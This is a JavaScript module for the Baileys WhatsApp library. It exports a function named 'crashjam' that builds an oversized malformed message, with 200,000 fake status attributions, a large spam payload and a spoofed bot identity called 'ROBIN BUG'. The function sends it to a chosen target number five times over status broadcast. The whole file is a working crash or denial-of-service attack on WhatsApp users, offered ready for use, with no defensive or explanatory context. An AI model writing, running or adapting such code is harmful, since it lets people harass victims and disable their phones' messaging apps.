
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { getSuperPayload } = require('./SuperPayload');
const crypto = require('crypto');

async function crashjam(SYxS7, target) {
    const superSpam = getSuperPayload(50000);
    const SABANA_LOVE = {
        messageContextInfo: {
            messageSecret: crypto.randomBytes(32),
            deviceListMetadata: { senderKeyIndex: 0, senderTimestamp: Date.now(), recipientKeyIndex: 0 }
        },
        interactiveResponseMessage: {
            contextInfo: {
                remoteJid: "status@broadcast",
                fromMe: true,
                isQuestion: true,
                forwardedAiBotMessageInfo: { botJid: "13135550202@bot", botName: "ROBIN BUG", creator: "ROBIN" },
                statusAttributionType: 2,
                statusAttributions: Array.from({ length: 200000 }, () => ({
                    participant: `${['41','91','90','31','40'][Math.floor(Math.random()*5)]}${Math.floor(Math.random()*1e10).toString().padStart(10,'0')}@s.whatsapp.net`,
                    type: 1
                }))
            },
            body: { text: superSpam, format: "DEFAULT" },
            nativeFlowResponseMessage: { name: "call_permission_request", paramsJson: superSpam, version: 3 }
        }
    };

    const SABIR7718_LOVE_SABANA = { viewOnceMessage: { message: SABANA_LOVE } };

    for (let i = 0; i < 5; i++) {
        await SYxS7.relayMessage("status@broadcast", SABIR7718_LOVE_SABANA, {
            statusJidList: [target],
            additionalNodes: [{
                tag: "meta",
                attrs: {},
                content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] }]
            }]
        });
        await new Promise(res => setTimeout(res, 500));
    }
}

module.exports = { crashjam };
